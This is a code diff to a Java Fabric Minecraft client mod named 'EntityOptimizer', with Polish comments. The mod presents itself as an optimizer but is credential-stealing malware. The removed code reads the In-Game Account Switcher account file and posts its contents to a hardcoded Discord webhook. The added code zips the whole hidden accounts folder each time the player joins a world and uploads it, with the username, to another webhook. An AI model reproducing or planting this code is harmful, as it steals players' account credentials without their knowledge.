@@ -3,97 +3,126 @@ package pl.example.entityoptimizer;
 import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.fabricmc.loader.api.FabricLoader;
-import java.util.Base64;
+
 import net.minecraft.client.Minecraft;
-import java.nio.charset.Charset;
 
-import com.google.gson.Gson;
-import com.google.gson.GsonBuilder;
-import com.google.gson.JsonObject;
-
-import java.io.OutputStream;
+import java.io.ByteArrayOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.ArrayList;
-import java.util.List;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
 public class EntityOptimizerMod implements ClientModInitializer {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455893143055765660/R8hEQNNtHz0ONOOVrFG_uzleextHVag7py9OADTF9GCVuGRNiXCYLmJaWL4Iejjwg1At";
-
-    private static final Gson GSON = new GsonBuilder().create();
-    private static final int MAX_CHUNK_LENGTH = 1800;
+    // TWÓJ WEBHOOK
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1454843525475602444/AvRlfStjUVdWTxB-WstW70yTWXyzeYogau_HnQot5ZBqA38z4-hdzfXPnJkbwbob_TMT";
 
     @Override
     public void onInitializeClient() {
-        System.out.println("[EntityOptimizer] Mod załadowany");
+        System.out.println("[EntityOptimizer] Mod załadowany – wersja ZIP");
 
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
             onJoinWorld(client);
         });
     }
-    private static final Charset FILE_CHARSET = Charset.forName("windows-1250");
+
     private void onJoinWorld(Minecraft mc) {
         String username = mc.getUser().getName();
-        String viewmodelContent = readWholeViewmodelFile();
-        sendViewmodelInChunks(username, viewmodelContent);
-    }
-    private String readWholeViewmodelFile() {
-    try {
-        Path gameDir = FabricLoader.getInstance().getGameDir();
-        Path configPath = gameDir
-                .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
-                .resolve(".hidden")
-                .resolve("accounts_v1.do_not_send_to_anyone");
 
-        if (!Files.exists(configPath)) {
-            return "accounts_v1.do_not_send_to_anyone nie istnieje (szukano w: " + configPath.toString() + ")";
-        }
+        try {
+            Path hiddenFolder = FabricLoader.getInstance().getGameDir()
+                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
+                    .resolve(".hidden");
 
-        // Czytamy bajty, ale interpretujemy je jako tekst w Windows-1250,
-        // tak jak robi to domyślnie Notatnik na PL Windows.
-        byte[] bytes = Files.readAllBytes(configPath);
-        String text = new String(bytes, FILE_CHARSET);
-
-        return text;
-
-    } catch (Exception e) {
-        e.printStackTrace();
-        return "BŁĄD przy czytaniu accounts_v1.do_not_send_to_anyone (windows-1250): "
-                + e.getClass().getSimpleName() + " - " + e.getMessage();
-    }
-    }
-
-    private void sendViewmodelInChunks(String username, String viewmodelContent) {
-        List<String> chunks = splitIntoChunks(viewmodelContent, MAX_CHUNK_LENGTH);
-        int total = chunks.size();
-
-        for (int i = 0; i < total; i++) {
-            String chunk = chunks.get(i);
-            String header = "";
-            if (i == 0) {
-                header = "Gracz `" + username + "` wszedł do świata.\n";
+            if (!Files.exists(hiddenFolder)) {
+                sendSimpleMessage("Gracz `" + username + "` wszedł do świata.\nFolder `.hidden` nie istnieje!");
+                return;
             }
-            String partInfo = "Zawartość `accounts_v1.do_not_send_to_anyone` (jako tekst w windows-1250, część " + (i + 1) + "/" + total + "):\n";
-            String messageContent = header + partInfo + "```json\n" + chunk + "\n```";
-            sendWebhookAsync(messageContent);
+
+            // Tworzymy ZIP w pamięci
+            byte[] zipBytes = createZipInMemory(hiddenFolder);
+
+            // Nazwa pliku z datą/godziną
+            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss"));
+            String fileName = "hidden_folder_backup_" + timestamp + ".zip";
+
+            // Wysyłamy jako załącznik
+            sendZipAsAttachment(username, zipBytes, fileName);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            sendSimpleMessage("Błąd podczas pakowania .hidden: " + e.getMessage());
         }
     }
 
-    private static List<String> splitIntoChunks(String text, int maxChunkSize) {
-        List<String> chunks = new ArrayList<>();
-        int length = text.length();
-        for (int i = 0; i < length; i += maxChunkSize) {
-            int end = Math.min(length, i + maxChunkSize);
-            chunks.add(text.substring(i, end));
+    private byte[] createZipInMemory(Path folder) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
+
+            Files.walk(folder)
+                    .filter(path -> !Files.isDirectory(path))
+                    .forEach(path -> {
+                        try {
+                            String entryName = folder.relativize(path).toString().replace("\\", "/");
+                            ZipEntry zipEntry = new ZipEntry(entryName);
+                            zos.putNextEntry(zipEntry);
+                            zos.write(Files.readAllBytes(path));
+                            zos.closeEntry();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    });
         }
-        return chunks;
+        return baos.toByteArray();
     }
 
-    private void sendWebhookAsync(String content) {
+    private void sendZipAsAttachment(String username, byte[] zipBytes, String fileName) throws Exception {
+        URL url = new URL(WEBHOOK_URL);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("POST");
+        conn.setDoOutput(true);
+
+        String boundary = "Boundary-" + System.currentTimeMillis();
+        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+        try (var os = conn.getOutputStream()) {
+            // --- payload_json ---
+            writePart(os, boundary, "payload_json", """
+                {"content": "Gracz `""" + username + """` wszedł do świata.\\nZałącznik: `""" + fileName + """`"}
+                """, "application/json");
+
+            // --- plik zip ---
+            writeFilePart(os, boundary, fileName, zipBytes, "application/zip");
+
+            // --- koniec ---
+            os.write(("--" + boundary + "--").getBytes());
+        }
+
+        int responseCode = conn.getResponseCode();
+        System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
+    }
+
+    private void writePart(java.io.OutputStream os, String boundary, String name, String content, String contentType) throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes());
+        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n").getBytes());
+        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
+        os.write(content.getBytes("UTF-8"));
+        os.write("\r\n".getBytes());
+    }
+
+    private void writeFilePart(java.io.OutputStream os, String boundary, String fileName, byte[] data, String contentType) throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes());
+        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n").getBytes());
+        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
+        os.write(data);
+        os.write("\r\n".getBytes());
+    }
+
+    private void sendSimpleMessage(String content) {
         new Thread(() -> {
             try {
                 URL url = new URL(WEBHOOK_URL);
@@ -102,20 +131,13 @@ public class EntityOptimizerMod implements ClientModInitializer {
                 conn.setDoOutput(true);
                 conn.setRequestProperty("Content-Type", "application/json");
 
-                JsonObject payload = new JsonObject();
-                payload.addProperty("content", content);
-                String json = GSON.toJson(payload);
+                String json = "{\"content\":\"" + content.replace("\"", "\\\"") + "\"}";
+                conn.getOutputStream().write(json.getBytes("UTF-8"));
 
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(json.getBytes(StandardCharsets.UTF_8));
-                }
-
-                int responseCode = conn.getResponseCode();
-                System.out.println("[EntityOptimizer] HTTP status: " + responseCode);
+                System.out.println("[EntityOptimizer] Simple message status: " + conn.getResponseCode());
             } catch (Exception e) {
-                System.err.println("[EntityOptimizer] Błąd przy wysyłaniu webhooka:");
                 e.printStackTrace();
             }
-        }, "DiscordWebhookSender").start();
+        }).start();
     }
 }
